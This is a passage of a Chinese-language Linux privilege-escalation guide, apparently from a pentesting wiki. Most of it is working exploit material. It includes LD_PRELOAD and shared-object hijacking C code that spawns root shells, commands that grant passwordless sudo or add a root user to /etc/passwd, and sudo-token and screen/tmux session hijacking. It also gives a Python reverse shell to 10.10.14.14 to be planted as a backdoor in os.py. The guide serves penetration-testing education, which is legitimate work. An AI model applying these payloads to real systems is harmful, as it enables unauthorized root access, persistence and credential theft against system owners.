sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### 绕过路径执行Sudo

**跳转**到其他文件或使用**符号链接**。例如在sudoers文件中：_hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用通配符（\*），那就更容易了：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**对策**：[https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### 没有指定命令路径的Sudo命令/SUID二进制文件

如果给予**sudo权限**给单个命令**而没有指定路径**：_hacker10 ALL= (root) less_，您可以通过更改PATH变量来利用它
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
这种技术也可以用于**suid**二进制文件**在不指定路径的情况下执行另一个命令（始终使用**_**strings**_**检查奇怪的SUID二进制文件的内容）**。

[执行的有效载荷示例。](payloads-to-execute.md)

### 具有命令路径的SUID二进制文件

如果**suid**二进制文件**执行另一个指定路径的命令**，那么您可以尝试**导出一个与suid文件调用的命令同名的函数**。

例如，如果一个suid二进制文件调用了_**/usr/sbin/service apache2 start**_，您必须尝试创建并导出该函数：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD_PRELOAD**环境变量用于指定要在加载器加载所有其他共享库（.so文件）之前加载的一个或多个共享库。这个过程被称为预加载库。

然而，为了维护系统安全并防止这个功能被滥用，特别是对于**suid/sgid**可执行文件，系统强制执行一定的条件：

- 加载器对于真实用户ID（_ruid_）与有效用户ID（_euid_）不匹配的可执行文件忽略**LD_PRELOAD**。
- 对于suid/sgid的可执行文件，只有标准路径中也是suid/sgid的库才会被预加载。

特权升级可能发生在你有能力使用`sudo`执行命令，并且`sudo -l`的输出包含语句**env_keep+=LD_PRELOAD**。这种配置允许**LD_PRELOAD**环境变量持续存在并在使用`sudo`运行命令时被识别，可能导致以提升的权限执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令**编译它**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，**提升权限**运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
如果攻击者控制**LD\_LIBRARY\_PATH**环境变量，就可以滥用类似的权限提升，因为攻击者控制了库将被搜索的路径。
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID二进制文件 - .so注入

当遇到具有**SUID**权限且看起来不寻常的二进制文件时，最好验证它是否正确加载**.so**文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 的错误表明存在潜在的利用可能。

要利用这个问题，可以创建一个名为 _"/path/to/.config/libcalc.c"_ 的 C 文件，其中包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
这段代码一旦编译并执行，旨在通过操纵文件权限并以提升的权限执行shell来提升权限。

使用以下命令将上述C文件编译为共享对象（.so）文件：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
## 共享对象劫持

最后，运行受影响的SUID二进制文件应该会触发利用，从而可能导致系统受损。
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
现在我们已经找到一个SUID二进制文件，它从一个我们可以写入的文件夹加载库，请在该文件夹中创建具有必要名称的库：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果出现以下错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要有一个名为`a_function_name`的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io)是一个策划的Unix二进制文件列表，攻击者可以利用这些二进制文件来绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/)也是类似的，但适用于只能在命令中**注入参数**的情况。

该项目收集了Unix二进制文件的合法功能，这些功能可以被滥用以突破受限制的shell、提升或保持提升的特权、传输文件、生成绑定和反向shell，并促进其他后渗透任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

如果你可以访问`sudo -l`，你可以使用工具[**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo)来检查是否找到了如何利用任何sudo规则的方法。

### 重用Sudo令牌

在你有**sudo访问权限**但没有密码的情况下，你可以通过**等待sudo命令执行然后劫持会话令牌**来提升权限。

提升权限的要求：

* 你已经作为用户"_sampleuser_"拥有一个shell
* "_sampleuser_"已经**使用`sudo`**在**最近15分钟**内执行了某些操作（默认情况下，这是sudo令牌的持续时间，允许我们在不输入任何密码的情况下使用`sudo`）
* `cat /proc/sys/kernel/yama/ptrace_scope`为0
* 可以访问`gdb`（你可以上传它）

（你可以使用`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`临时启用`ptrace_scope`，或者永久修改`/etc/sysctl.d/10-ptrace.conf`并设置`kernel.yama.ptrace_scope = 0`）

如果所有这些要求都满足，**你可以使用以下方式提升权限：** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* 第一个利用（`exploit.sh`）将在_tmp_中创建二进制文件`activate_sudo_token`。你可以使用它来**激活你会话中的sudo令牌**（你不会自动获得root shell，请执行`sudo su`）:
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* 第二个漏洞 (`exploit_v2.sh`) 将在 _/tmp_ 目录中创建一个由 root 拥有并设置了 setuid 的 sh shell
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* 第三个漏洞利用 (`exploit_v3.sh`) 将创建一个 sudoers 文件，使 sudo 令牌永久有效，并允许所有用户使用 sudo
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<用户名>

如果您对该文件夹或文件夹中创建的任何文件具有**写权限**，则可以使用二进制文件[**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools)来**为用户和PID创建sudo令牌**。\
例如，如果您可以覆盖文件 _/var/run/sudo/ts/sampleuser_，并且您作为具有PID 1234的该用户的shell，您可以**在不需要知道密码的情况下**获得sudo特权执行以下操作：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件`/etc/sudoers`和`/etc/sudoers.d`目录中的文件配置了谁可以使用`sudo`以及如何使用。这些文件**默认情况下只能被root用户和root组读取**。\
**如果**你可以**读取**这个文件，你可能能够**获取一些有趣的信息**，如果你可以**写入**任何文件，你将能够**提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你可以写入，你可以滥用这个权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
另一种滥用这些权限的方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些替代`sudo`二进制文件的选择，比如OpenBSD的`doas`，记得检查其配置文件在`/etc/doas.conf`中。
```
permit nopass demo as root cmd vim
```
### Sudo劫持

如果你知道一个**用户通常连接到一台机器并使用`sudo`来提升权限**，而你已经在该用户上下文中获得了一个shell，你可以**创建一个新的sudo可执行文件**，该文件将以root权限执行你的代码，然后执行用户的命令。然后，**修改用户上下文中的$PATH**（例如在.bash\_profile中添加新路径），这样当用户执行sudo时，将执行你的sudo可执行文件。

请注意，如果用户使用不同的shell（不是bash），你将需要修改其他文件以添加新路径。例如[sudo-piggyback](https://github.com/APTy/sudo-piggyback)修改了`~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你可以在[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)中找到另一个示例。

或者运行类似以下内容：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件`/etc/ld.so.conf`指示**加载的配置文件来源**。通常，此文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着将读取`/etc/ld.so.conf.d/*.conf`中的配置文件。这些配置文件**指向其他文件夹**，其中将**搜索库**。例如，`/etc/ld.so.conf.d/libc.conf`的内容是`/usr/local/lib`。**这意味着系统将在`/usr/local/lib`内搜索库**。

如果由于某种原因**用户对所指示的任何路径**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/`内的任何文件或`/etc/ld.so.conf.d/*.conf`内的任何文件夹具有写权限，他可能能够升级权限。\
查看如何**利用此错误配置**在以下页面：

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将lib复制到`/var/tmp/flag15/`中，它将被程序在此位置使用，如`RPATH`变量中指定的那样。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
### 提升权限

创建一个恶意库在 `/var/tmp` 目录下，使用以下命令：

```bash
gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6
```
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 权限

Linux 权限为进程提供了**一部分可用的 root 权限**。这有效地将 root **权限分解为更小且独特的单元**。然后可以独立地将这些单元授予进程。这样，完整的权限集合被减少，降低了利用风险。\
阅读以下页面以**了解更多关于权限和如何滥用它们**：

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## 目录权限

在一个目录中，**"执行"** 位意味着受影响的用户可以**进入**该文件夹。\
**"读取"** 位意味着用户可以**列出**文件，而**"写入"** 位意味着用户可以**删除**和**创建**新的**文件**。

## ACLs

访问控制列表（ACLs）代表了可**覆盖传统 ugo/rwx 权限**的次级自由权限层。这些权限通过允许或拒绝对不是所有者或组成员的特定用户的权限，增强了对文件或目录访问的控制。这种**粒度确保了更精确的访问管理**。更多详细信息可以在[**这里**](https://linuxconfig.org/how-to-manage-acls-on-linux)找到。

**授予**用户"kali"对文件的读取和写入权限：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取**系统中具有特定ACL的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开shell会话

在旧版本中，您可能会劫持不同用户（root）的某些shell会话。\
在最新版本中，您只能连接到自己用户的screen会话。但是，您可能会在会话中找到有趣的信息。

### screen会话劫持

**列出screen会话**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**附加到会话**

![](<../../.gitbook/assets/image (130).png>)
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux会话劫持

这是**旧版tmux版本**的一个问题。我无法劫持由root创建的tmux (v2.1)会话，作为一个非特权用户。

**列出tmux会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**附加到会话**

![](<../../.gitbook/assets/image (131).png>)
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

所有在基于Debian的系统（如Ubuntu，Kubuntu等）上在2006年9月至2008年5月13日之间生成的SSL和SSH密钥可能受到此漏洞的影响。\
此漏洞是在这些操作系统中创建新的ssh密钥时引起的，因为**只有32,768种可能的变化**。这意味着所有可能性都可以计算出来，**拥有ssh公钥后，您可以搜索相应的私钥**。您可以在这里找到计算出的可能性：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH有趣的配置值

* **PasswordAuthentication:** 指定是否允许密码身份验证。默认值为 `no`。
* **PubkeyAuthentication:** 指定是否允许公钥身份验证。默认值为 `yes`。
* **PermitEmptyPasswords**: 当允许密码身份验证时，指定服务器是否允许登录到空密码字符串的帐户。默认值为 `no`。

### PermitRootLogin

指定是否允许root使用ssh登录，默认值为 `no`。可能的值：

* `yes`: root可以使用密码和私钥登录
* `without-password` 或 `prohibit-password`: root只能使用私钥登录
* `forced-commands-only`: root只能使用私钥登录，如果指定了命令选项
* `no` : 否

### AuthorizedKeysFile

指定包含可用于用户身份验证的公钥的文件。它可以包含像`%h`这样的令牌，该令牌将被主目录替换。**您可以指定绝对路径**（从`/`开始）或**相对于用户主目录的相对路径**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
那个配置将指示，如果您尝试使用用户“**testusername**”的**私钥**登录，ssh将会将您的密钥的公钥与位于`/home/testusername/.ssh/authorized_keys`和`/home/testusername/access`中的公钥进行比较。

### ForwardAgent/AllowAgentForwarding

SSH代理转发允许您**使用本地SSH密钥**，而不是让密钥（没有密码短语！）留在服务器上。因此，您将能够通过ssh**跳转**到一个主机，然后从那里**使用**位于您**初始主机**中的**密钥**跳转到另一个主机。

您需要在`$HOME/.ssh.config`中设置此选项，如下所示：
```
Host example.com
ForwardAgent yes
```
注意，如果`Host`是`*`，每次用户跳转到另一台机器时，该主机将能够访问密钥（这是一个安全问题）。

文件`/etc/ssh_config`可以**覆盖**这些**选项**，允许或拒绝此配置。\
文件`/etc/sshd_config`可以**允许**或**拒绝**ssh-agent转发，关键字是`AllowAgentForwarding`（默认为允许）。

如果发现在环境中配置了转发代理，请阅读以下页面，**可能可以利用它来提升权限**：

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## 有趣的文件

### 配置文件

文件`/etc/profile`和`/etc/profile.d/`目录下的文件是**用户运行新shell时执行的脚本**。因此，如果您可以**编写或修改其中任何一个文件，就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
### Passwd/Shadow Files

根据操作系统的不同，`/etc/passwd` 和 `/etc/shadow` 文件的名称可能不同，或者可能有备份。因此，建议**找到所有这些文件**，并**检查是否可以读取**这些文件，以查看文件中是否包含**哈希值**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，您可以在 `/etc/passwd`（或等效文件）中找到**密码哈希值**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下命令之一生成一个密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
然后添加用户 `hacker` 并添加生成的密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如：`hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

您现在可以使用`su`命令与`hacker:hacker`一起使用

或者，您可以使用以下行添加一个没有密码的虚拟用户。\
警告：您可能会降低机器当前的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**注意：在BSD平台上，`/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，`/etc/shadow` 被重命名为 `/etc/spwd.db`。**

你应该检查是否可以**写入一些敏感文件**。例如，你能写入一些**服务配置文件**吗？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行一个**tomcat**服务器，并且你可以**修改位于 /etc/systemd/ 内的 Tomcat 服务配置文件**，那么你可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
### 检查文件夹

以下文件夹可能包含备份或有趣的信息：**/tmp**，**/var/tmp**，**/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（可能无法读取最后一个，但尝试一下）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/拥有的文件
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟内修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite数据库文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **路径中的脚本/可执行文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Web文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含密码的文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它搜索**可能包含密码的多个文件**。\
另一个有趣的工具是：[**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用程序，用于检索存储在Windows、Linux和Mac本地计算机上的许多密码。

### 日志

如果你能读取日志，可能会发现其中包含**有趣/机密信息**。日志越奇怪，可能就越有趣。\
此外，一些“**不好的**”配置（后门？）**审计日志**可能允许你在审计日志中**记录密码**，如此文章中所述：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了**读取日志组**，[**adm**](interesting-groups-linux-pe/#adm-group)组将非常有帮助。

### Shell文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 通用凭证搜索/正则表达式

您还应检查包含单词“**password**”在其**名称**或内容中的文件，并在日志中检查IP和电子邮件，或哈希正则表达式。\
我不会在这里列出如何执行所有这些操作，但如果您感兴趣，可以查看[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后检查。

## 可写文件

### Python库劫持

如果您知道一个python脚本将从**哪里**执行，并且您**可以在**该文件夹中写入或者您可以**修改python库**，您可以修改OS库并在其中设置后门（如果您可以在python脚本将要执行的位置写入，复制并粘贴os.py库）。

要**设置库后门**，只需在os.py库的末尾添加以下行（更改IP和端口）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate利用

`logrotate`中的一个漏洞允许具有对日志文件或其父目录的**写权限**的用户可能获得提升的特权。这是因为`logrotate`通常以**root**身份运行，可以被操纵以执行任意文件，特别是在_**/etc/bash_completion.d/**_等目录中。重要的是要检查权限不仅在_/var/log_中，还要在应用日志轮换的任何目录中。

{% hint style="info" %}
此漏洞影响`logrotate`版本`3.18.0`及更旧版本
{% endhint %}

有关漏洞的更详细信息可以在此页面找到：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

您可以使用[**logrotten**](https://github.com/whotwagner/logrotten)来利用此漏洞。

此漏洞与[**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx日志)**非常相似，因此每当发现可以更改日志时，请检查谁正在管理这些日志，并检查是否可以通过符号链接替换日志以提升特权。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**漏洞参考：** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果出于任何原因，用户能够在_/etc/sysconfig/network-scripts_中**编写**一个`ifcf-<whatever>`脚本，**或者**可以**调整**现有的脚本，那么您的**系统就被入侵**了。

网络脚本，例如_ifcg-eth0_用于网络连接。它们看起来完全像.INI文件。但是，在Linux上，它们是通过Network Manager（dispatcher.d）\~源\~的。

在我的情况下，这些网络脚本中的`NAME=`属性未被正确处理。如果名称中有**空格，系统会尝试执行空格后面的部分**。这意味着**第一个空格后的所有内容都将以root身份执行**。

例如：_/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init、init.d、systemd 和 rc.d**

目录 `/etc/init.d` 存放着 System V init（SysVinit）的**脚本**，这是经典的 Linux 服务管理系统。它包括用于 `start`、`stop`、`restart` 以及有时 `reload` 服务的脚本。这些脚本可以直接执行，也可以通过在 `/etc/rc?.d/` 中找到的符号链接执行。在 Redhat 系统中的另一条路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关联，这是由 Ubuntu 引入的较新的**服务管理**，使用配置文件来执行服务管理任务。尽管过渡到 Upstart，由于 Upstart 中的兼容性层，SysVinit 脚本仍然与 Upstart 配置一起使用。

**systemd** 是一种现代化的初始化和服务管理器，提供高级功能，如按需启动守护进程、自动挂载管理和系统状态快照。它将文件组织到 `/usr/lib/systemd/` 用于分发软件包，以及 `/etc/systemd/system/` 用于管理员修改，简化了系统管理过程。
